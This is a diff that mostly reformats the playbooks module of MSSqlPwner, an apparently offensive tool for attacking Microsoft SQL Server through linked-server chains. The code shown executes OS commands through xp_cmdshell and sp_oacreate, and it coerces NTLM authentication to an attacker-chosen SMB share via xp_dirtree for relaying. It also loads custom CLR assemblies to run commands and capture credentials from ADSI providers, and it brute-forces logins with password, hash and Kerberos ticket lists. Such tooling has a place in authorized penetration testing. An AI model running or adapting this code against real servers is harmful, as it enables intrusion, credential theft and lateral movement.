@@ -1,4 +1,3 @@
-
 # Built-in imports
 import os
 import sys
@@ -21,23 +20,26 @@ import mssqlpwner.utilities as utilities
 from mssqlpwner.playbooks import queries
 from mssqlpwner.classes.operations import Operations
 
+
 class CompositeAutoSuggest(AutoSuggest):
     def __init__(self, available_modules):
         self.available_modules = available_modules
 
     def get_suggestion(self, buffer, document):
         text = document.text_before_cursor
-        suggestions = [module for module in self.available_modules if module.startswith(text)]
+        suggestions = [
+            module for module in self.available_modules if module.startswith(text)
+        ]
         if suggestions:
-            return Suggestion(suggestions[0][len(text):])
+            return Suggestion(suggestions[0][len(text) :])
 
         # Fall back to history auto-suggest if no module suggestion is found
         return AutoSuggestFromHistory().get_suggestion(buffer, document)
 
+
 class Playbooks(Operations):
     def __init__(self, server_address, user_name, args_options):
         super().__init__(server_address, user_name, args_options)
-
 
     def disconnect(self, rev2self: bool = True) -> None:
         """
@@ -53,8 +55,9 @@ class Playbooks(Operations):
         """
         if os.path.exists(self.state_filename):
             if self.use_state:
-                if self.auto_yes or utilities.receive_answer("State file already exists, do you want to use it?",
-                                                             ["y", "n"], 'y'):
+                if self.auto_yes or utilities.receive_answer(
+                    "State file already exists, do you want to use it?", ["y", "n"], "y"
+                ):
                     self.state = json.load(open(self.state_filename))
                 else:
                     self.retrieve_links_recursive()
@@ -66,8 +69,12 @@ class Playbooks(Operations):
             utilities.print_state(self.state)
         return True
 
-    def execute_command_by_procedure(self, chain_id: str,
-                                     command_execution_method: Literal['xp_cmdshell', 'sp_oacreate'], command: str):
+    def execute_command_by_procedure(
+        self,
+        chain_id: str,
+        command_execution_method: Literal["xp_cmdshell", "sp_oacreate"],
+        command: str,
+    ):
         """
         This function is responsible to execute a command on the server using existing procedures.
         e.g. xp_cmdshell, sp_oacreate
@@ -78,8 +85,12 @@ class Playbooks(Operations):
 
         return self.execute_procedure(chain_id, command_execution_method, command)
 
-    def ntlm_relay(self, chain_id: str, relay_method: Literal['xp_dirtree', 'xp_subdirs', 'xp_fileexist'],
-                   smb_server: str):
+    def ntlm_relay(
+        self,
+        chain_id: str,
+        relay_method: Literal["xp_dirtree", "xp_subdirs", "xp_fileexist"],
+        smb_server: str,
+    ):
         """
         This function is responsible to execute a ntlm-relay attack on the server using existing procedures.
         e.g. xp_dirtree, xp_subdirs, xp_fileexist
@@ -88,10 +99,12 @@ class Playbooks(Operations):
             LOG.error("SMB server is required for ntlm-relay module")
             return False
 
-        share = fr"\\{smb_server}\{utilities.generate_string()}\{utilities.generate_string()}"
+        share = rf"\\{smb_server}\{utilities.generate_string()}\{utilities.generate_string()}"
         return self.execute_procedure(chain_id, relay_method, share)
 
-    def execute_direct_query(self, chain_id: str, method: Literal['OpenQuery', 'exec_at'], query: str):
+    def execute_direct_query(
+        self, chain_id: str, method: Literal["OpenQuery", "exec_at"], query: str
+    ):
         """
         This function is responsible to execute a query on the server.
         e.g. OpenQuery, exec_at
@@ -101,14 +114,20 @@ class Playbooks(Operations):
             return False
         return self.direct_query(chain_id, query, method)
 
-    def retrieve_password(self, chain_id: str, port: int, adsi_provider: str,
-                          arch: Literal['autodetect', 'x86', 'x64'], target: str) -> bool:
+    def retrieve_password(
+        self,
+        chain_id: str,
+        port: int,
+        adsi_provider: str,
+        arch: Literal["autodetect", "x86", "x64"],
+        target: str,
+    ) -> bool:
         """
         This function is responsible to retrieve passwords from the server using custom assemblies.
         """
         domain, username, password, address = parse_target(target)
         server_info = self.get_server_info(chain_id)
-        if not server_info['adsi_providers']:
+        if not server_info["adsi_providers"]:
             LOG.error("No ADSI providers found")
             return True
 
@@ -118,29 +137,42 @@ class Playbooks(Operations):
             LOG.error(f"Failed to detect the architecture of {chain_str}")
             return False
 
-        ldap_filename = "LdapServer-x64.dll" if arch == 'x64' else "LdapServer-x86.dll"
-        ldap_assembly = os.path.join('playbooks', 'custom-asm', ldap_filename)
-        if not server_info['adsi_providers']:
+        ldap_filename = "LdapServer-x64.dll" if arch == "x64" else "LdapServer-x86.dll"
+        ldap_assembly = os.path.join("playbooks", "custom-asm", ldap_filename)
+        if not server_info["adsi_providers"]:
             return False
 
-        if adsi_provider and adsi_provider not in server_info['adsi_providers']:
-            LOG.error(f"The {chain_str} server does not support the {adsi_provider} provider")
+        if adsi_provider and adsi_provider not in server_info["adsi_providers"]:
+            LOG.error(
+                f"The {chain_str} server does not support the {adsi_provider} provider"
+            )
             return False
-        for discovered_provider in server_info['adsi_providers']:
+        for discovered_provider in server_info["adsi_providers"]:
             if adsi_provider and adsi_provider != discovered_provider:
                 continue
 
             if not adsi_provider:
                 if (not self.auto_yes) and not utilities.receive_answer(
-                        f"Do you want to retrieve passwords from {discovered_provider} provider?",
-                        ["y", "n"], 'y'):
+                    f"Do you want to retrieve passwords from {discovered_provider} provider?",
+                    ["y", "n"],
+                    "y",
+                ):
                     continue
 
-            listener = self.execute_custom_assembly(chain_id, 'function', ldap_assembly, "FuncAsm", "listen",
-                                                    "@port int", str(port), wait=False, class_name="LdapSrv",
-                                                    namespace="ldapAssembly")
+            listener = self.execute_custom_assembly(
+                chain_id,
+                "function",
+                ldap_assembly,
+                "FuncAsm",
+                "listen",
+                "@port int",
+                str(port),
+                wait=False,
+                class_name="LdapSrv",
+                namespace="ldapAssembly",
+            )
 
-            if listener and listener['is_success']:
+            if listener and listener["is_success"]:
                 client = Playbooks(self.server_address, self.username, self.options)
                 client.options.debug = False
                 LOG.setLevel(logging.ERROR)
@@ -148,14 +180,18 @@ class Playbooks(Operations):
                 client.state = self.state
                 LOG.setLevel(logging.DEBUG if self.debug else logging.INFO)
                 client.options.debug = self.options.debug
-                client.build_chain(chain_id, queries.ldap_query("localhost", port),
-                                   method="OpenQuery", adsi_provider=discovered_provider)
+                client.build_chain(
+                    chain_id,
+                    queries.ldap_query("localhost", port),
+                    method="OpenQuery",
+                    adsi_provider=discovered_provider,
+                )
 
                 client.disconnect(rev2self=False)
-                results = listener['thread'].join()
-                if results and results['is_success']:
+                results = listener["thread"].join()
+                if results and results["is_success"]:
                     LOG.info(f"Successfully retrieved password from {chain_str}")
-                    for credentials in results['results'][0].values():
+                    for credentials in results["results"][0].values():
                         LOG.info(f"[+] Discovered credentials: {credentials}")
                     return True
                 else:
@@ -167,15 +203,17 @@ class Playbooks(Operations):
         This function is responsible to return the chain list.
         """
         LOG.info("Chain list:")
-        for server_info in utilities.sort_by_chain_length([v for k, v in self.state['servers_info'].items()]):
+        for server_info in utilities.sort_by_chain_length(
+            [v for k, v in self.state["servers_info"].items()]
+        ):
             if filter_hostname:
-                if filter_hostname != server_info['hostname']:
+                if filter_hostname != server_info["hostname"]:
                     continue
-            chain_id = server_info['chain_id']
+            chain_id = server_info["chain_id"]
             chain_str = self.generate_chain_str(chain_id)
-            user_name = server_info['server_user']
-            db_user = server_info['db_user']
-            db_name = server_info['db_name']
+            user_name = server_info["server_user"]
+            db_user = server_info["db_user"]
+            db_name = server_info["db_name"]
             LOG.info(f"{chain_id} - {chain_str} ({user_name} {db_user}@{db_name})")
         return True
 
@@ -185,13 +223,17 @@ class Playbooks(Operations):
         """
         LOG.info("Linked_server_list:")
         link_servers = []
-        for server_info in utilities.sort_by_chain_length([v for k, v in self.state['servers_info'].items()]):
-            link_name = server_info['link_name']
+        for server_info in utilities.sort_by_chain_length(
+            [v for k, v in self.state["servers_info"].items()]
+        ):
+            link_name = server_info["link_name"]
             link_host = f"{server_info['hostname']}.{server_info['domain_name']}"
             if link_host in link_servers:
                 continue
             link_servers.append(link_host)
-            LOG.info(f"{link_name} (Hostname: {server_info['hostname']} | Domain: {server_info['domain_name']})")
+            LOG.info(
+                f"{link_name} (Hostname: {server_info['hostname']} | Domain: {server_info['domain_name']})"
+            )
         return True
 
     def call_rev2self(self) -> bool:
@@ -227,7 +269,7 @@ class Playbooks(Operations):
             server_list = self.filter_server_by_link_name(link_name)
 
         for server_info in server_list:
-            yield server_info['chain_id']
+            yield server_info["chain_id"]
 
     def get_adsi_provider_list(self):
         """
@@ -235,21 +277,27 @@ class Playbooks(Operations):
         """
         LOG.info("ADSI Providers:")
         link_servers = []
-        for server_info in utilities.sort_by_chain_length([v for k, v in self.state['servers_info'].items()]):
-            link_name = server_info['link_name']
+        for server_info in utilities.sort_by_chain_length(
+            [v for k, v in self.state["servers_info"].items()]
+        ):
+            link_name = server_info["link_name"]
             link_host = f"{server_info['hostname']}.{server_info['domain_name']}"
-            if not server_info['adsi_providers']:
+            if not server_info["adsi_providers"]:
                 continue
             if link_host in link_servers:
                 continue
             link_servers.append(link_host)
-            LOG.info(f"{link_name} (Providers: {', '.join(server_info['adsi_providers'])})")
+            LOG.info(
+                f"{link_name} (Providers: {', '.join(server_info['adsi_providers'])})"
+            )
         return True
 
     def interactive_mode(self, options) -> bool:
 
         chosen_chain_id = options.chain_id
-        chosen_link_name = options.link_name if options.link_name else self.state['hostname']
+        chosen_link_name = (
+            options.link_name if options.link_name else self.state["hostname"]
+        )
         parser, available_modules = utilities.generate_arg_parser()
         available_modules.remove("interactive")
         available_modules += ["help", "exit"]
@@ -271,14 +319,16 @@ class Playbooks(Operations):
 
         while True:
             try:
-                chain_id = list(self.get_execution_list(chosen_chain_id, chosen_link_name))[0]
+                chain_id = list(
+                    self.get_execution_list(chosen_chain_id, chosen_link_name)
+                )[0]
                 title = self.generate_chain_str(chain_id)
 
                 args_list = session.prompt(ANSI(f"MSSqlPwner#{title}> ")).strip()
-                selected_module = args_list.split(' ')[0]
+                selected_module = args_list.split(" ")[0]
 
                 if selected_module not in available_modules:
-                    LOG.error(f'Unknown module {selected_module}.')
+                    LOG.error(f"Unknown module {selected_module}.")
                     LOG.info(f"Available modules:")
                     for available_module in available_modules:
                         LOG.info(f"\t - {available_module}")
@@ -289,7 +339,9 @@ class Playbooks(Operations):
                     parser.print_help()
                     continue
 
-                arguments = utilities.split_args(f'{" ".join(sys.argv[1:]).strip()} {args_list}')
+                arguments = utilities.split_args(
+                    f'{" ".join(sys.argv[1:]).strip()} {args_list}'
+                )
                 arguments.remove("interactive")
                 args = parser.parse_args(arguments)
 
@@ -323,8 +375,13 @@ class Playbooks(Operations):
 
         return True
 
-    def custom_asm(self, chain_id: str, arch: Literal['autodetect', 'x86', 'x64'], procedure_name: str,
-                   command: str) -> bool:
+    def custom_asm(
+        self,
+        chain_id: str,
+        arch: Literal["autodetect", "x86", "x64"],
+        procedure_name: str,
+        command: str,
+    ) -> bool:
         if not command:
             LOG.error("Command is required for custom-asm module")
             return False
@@ -335,64 +392,95 @@ class Playbooks(Operations):
             LOG.error(f"Failed to detect the architecture of {chain_str}")
             return False
 
-        asm_filename = "CmdExec-x64.dll" if arch_name == 'x64' else "CmdExec-x86.dll"
-        asm_file_location = os.path.join('playbooks', 'custom-asm', asm_filename)
+        asm_filename = "CmdExec-x64.dll" if arch_name == "x64" else "CmdExec-x86.dll"
+        asm_file_location = os.path.join("playbooks", "custom-asm", asm_filename)
 
-        custom_asm_results = self.execute_custom_assembly(chain_id, "procedure", asm_file_location, "CalcAsm",
-                                                          procedure_name, "@command NVARCHAR (4000)", command)
+        custom_asm_results = self.execute_custom_assembly(
+            chain_id,
+            "procedure",
+            asm_file_location,
+            "CalcAsm",
+            procedure_name,
+            "@command NVARCHAR (4000)",
+            command,
+        )
 
-        return custom_asm_results['is_success']
+        return custom_asm_results["is_success"]
 
-    def inject_custom_asm(self, chain_id: str, asm_file_location: str, procedure_name: str = "Inject") -> bool:
+    def inject_custom_asm(
+        self, chain_id: str, asm_file_location: str, procedure_name: str = "Inject"
+    ) -> bool:
         if not asm_file_location:
             LOG.error("File location is required for inject-custom-asm module")
             return False
         if not os.path.exists(asm_file_location):
             LOG.error(f"{asm_file_location} does not exist")
             return False
-        custom_asm_results = self.execute_custom_assembly(chain_id, "procedure", asm_file_location, "SqlInject",
-                                                          procedure_name, "@command NVARCHAR (4000)", "a")
-        return custom_asm_results['is_success']
+        custom_asm_results = self.execute_custom_assembly(
+            chain_id,
+            "procedure",
+            asm_file_location,
+            "SqlInject",
+            procedure_name,
+            "@command NVARCHAR (4000)",
+            "a",
+        )
+        return custom_asm_results["is_success"]
 
     def encapsulated_commands(self, chain_id: str, options):
         ret_val = False
         try:
-            if options.module == 'exec':
+            if options.module == "exec":
                 if not options.command:
                     return False
 
-                ret_val = self.execute_command_by_procedure(chain_id, options.command_execution_method, options.command)
+                ret_val = self.execute_command_by_procedure(
+                    chain_id, options.command_execution_method, options.command
+                )
 
-            elif options.module == 'ntlm-relay':
+            elif options.module == "ntlm-relay":
                 if not options.smb_server:
                     return False
-                ret_val = self.ntlm_relay(chain_id, options.relay_method, options.smb_server)
+                ret_val = self.ntlm_relay(
+                    chain_id, options.relay_method, options.smb_server
+                )
 
-            elif options.module == 'custom-asm':
+            elif options.module == "custom-asm":
                 if not options.command:
                     return False
-                ret_val = self.custom_asm(chain_id, options.arch, options.procedure_name, options.command)
-            elif options.module == 'inject-custom-asm':
-                self.inject_custom_asm(chain_id, options.file_location, options.procedure_name)
+                ret_val = self.custom_asm(
+                    chain_id, options.arch, options.procedure_name, options.command
+                )
+            elif options.module == "inject-custom-asm":
+                self.inject_custom_asm(
+                    chain_id, options.file_location, options.procedure_name
+                )
 
-            elif options.module == 'direct-query':
+            elif options.module == "direct-query":
                 if not options.query:
                     return False
-                ret_val = self.execute_direct_query(chain_id, options.query_method, options.query)
+                ret_val = self.execute_direct_query(
+                    chain_id, options.query_method, options.query
+                )
 
-            elif options.module == 'retrieve-password':
-                ret_val = self.retrieve_password(chain_id, options.listen_port, options.adsi_provider, options.arch,
-                                                 options.target)
+            elif options.module == "retrieve-password":
+                ret_val = self.retrieve_password(
+                    chain_id,
+                    options.listen_port,
+                    options.adsi_provider,
+                    options.arch,
+                    options.target,
+                )
 
-            elif options.module == 'get-chain-list':
+            elif options.module == "get-chain-list":
                 ret_val = self.get_chain_list(options.filter_hostname)
-            elif options.module == 'get-link-server-list':
+            elif options.module == "get-link-server-list":
                 ret_val = self.get_linked_server_list()
-            elif options.module == 'rev2self':
+            elif options.module == "rev2self":
                 ret_val = self.call_rev2self()
-            elif options.module == 'get-rev2self-queries':
+            elif options.module == "get-rev2self-queries":
                 ret_val = self.get_rev2self_queries()
-            elif options.module == 'get-adsi-provider-list':
+            elif options.module == "get-adsi-provider-list":
                 ret_val = self.get_adsi_provider_list()
             elif options.module == "interactive":
                 ret_val = self.interactive_mode(options)
@@ -404,7 +492,7 @@ class Playbooks(Operations):
         """
         This function is responsible to execute the given module.
         """
-        link_name = link_name if link_name else self.state['hostname']
+        link_name = link_name if link_name else self.state["hostname"]
         if options.module == "enumerate":
             # It returned without calling since it is already called in the main function.
             utilities.print_state(self.state)
@@ -423,25 +511,34 @@ class Playbooks(Operations):
             break
         return True
 
-    def brute(self, host: str, port: int, user: str, domain: str, cred: str,
-              auth_type: Literal['ticket', 'hash', 'password']) -> bool:
+    def brute(
+        self,
+        host: str,
+        port: int,
+        user: str,
+        domain: str,
+        cred: str,
+        auth_type: Literal["ticket", "hash", "password"],
+    ) -> bool:
         self.options.port = port
         mssql_client = Playbooks(host, port, self.options)
-        if auth_type == 'ticket':
+        if auth_type == "ticket":
             if not os.path.exists(cred):
                 LOG.error(f"{cred} does not exist")
                 return False
 
             if utilities.is_valid_ip(host):
-                LOG.warning(f"Skipping the {host} host since tickets are not supported for IP addresses")
+                LOG.warning(
+                    f"Skipping the {host} host since tickets are not supported for IP addresses"
+                )
                 return False
 
-            os.environ['KRB5CCNAME'] = cred
+            os.environ["KRB5CCNAME"] = cred
             mssql_client.options.k = True
             mssql_client.options.no_pass = True
             mssql_client.options.hashes = None
             password = ""
-        elif auth_type == 'hash':
+        elif auth_type == "hash":
             mssql_client.options.k = self.options.k
             mssql_client.options.no_pass = False
             mssql_client.options.hashes = cred.strip().lower()
@@ -457,33 +554,48 @@ class Playbooks(Operations):
         if mssql_client.connect(user, password, domain):
             LOG.setLevel(logging.INFO)
             full_user = f"{domain}\\{user}" if domain else user
-            LOG.info(f"Successfully connected to {host} with user {full_user} and {auth_type} {cred}")
+            LOG.info(
+                f"Successfully connected to {host} with user {full_user} and {auth_type} {cred}"
+            )
             return True
         LOG.setLevel(logging.DEBUG if self.debug else logging.INFO)
         return False
 
-    def bruteforce(self, hosts_list: str, user_list: str, password_list: str, hash_list: str, ticket_list: str):
+    def bruteforce(
+        self,
+        hosts_list: str,
+        user_list: str,
+        password_list: str,
+        hash_list: str,
+        ticket_list: str,
+    ):
         if not os.path.exists(hosts_list):
             LOG.error(f"{hosts_list} hosts file does not exist")
             return False
-        if not os.path.exists(password_list) and not os.path.exists(hash_list) and not os.path.exists(ticket_list):
-            LOG.error("You should provide at least one of the password, hash or ticket list")
+        if (
+            not os.path.exists(password_list)
+            and not os.path.exists(hash_list)
+            and not os.path.exists(ticket_list)
+        ):
+            LOG.error(
+                "You should provide at least one of the password, hash or ticket list"
+            )
             return False
         if not os.path.exists(user_list):
             LOG.error(f"{user_list} users file does not exist")
             return False
-        hosts_list_content = open(hosts_list, 'r').readlines()
-        user_list_content = open(user_list, 'r').readlines()
+        hosts_list_content = open(hosts_list, "r").readlines()
+        user_list_content = open(user_list, "r").readlines()
         password_list_content = []
         hash_list_content = []
         ticket_list_content = []
 
         if os.path.exists(password_list):
-            password_list_content = open(password_list, 'r').readlines()
+            password_list_content = open(password_list, "r").readlines()
         if os.path.exists(hash_list):
-            hash_list_content = open(hash_list, 'r').readlines()
+            hash_list_content = open(hash_list, "r").readlines()
         if os.path.exists(ticket_list):
-            ticket_list_content = open(ticket_list, 'r').readlines()
+            ticket_list_content = open(ticket_list, "r").readlines()
 
         for host_line in hosts_list_content:
             host_line = host_line.strip()
@@ -509,7 +621,7 @@ class Playbooks(Operations):
                     ticket = ticket.strip()
                     if not ticket:
                         continue
-                    self.brute(host, port, user, domain, ticket, 'ticket')
+                    self.brute(host, port, user, domain, ticket, "ticket")
 
                 for ntlm_hash in hash_list_content:
                     ntlm_hash = ntlm_hash.strip()
@@ -517,15 +629,14 @@ class Playbooks(Operations):
                         continue
 
                     if ":" not in ntlm_hash:
-                        LOG.error(f"{ntlm_hash} is not a valid NTLM hash, NTLM hash should be in that format: NT:LM")
+                        LOG.error(
+                            f"{ntlm_hash} is not a valid NTLM hash, NTLM hash should be in that format: NT:LM"
+                        )
                         continue
-                    self.brute(host, port, user, domain, ntlm_hash, 'hash')
+                    self.brute(host, port, user, domain, ntlm_hash, "hash")
 
                 for password in password_list_content:
                     password = password.strip()
                     if not password:
                         continue
-                    self.brute(host, port, user, domain, password, 'password')
-
-
-
+                    self.brute(host, port, user, domain, password, "password")
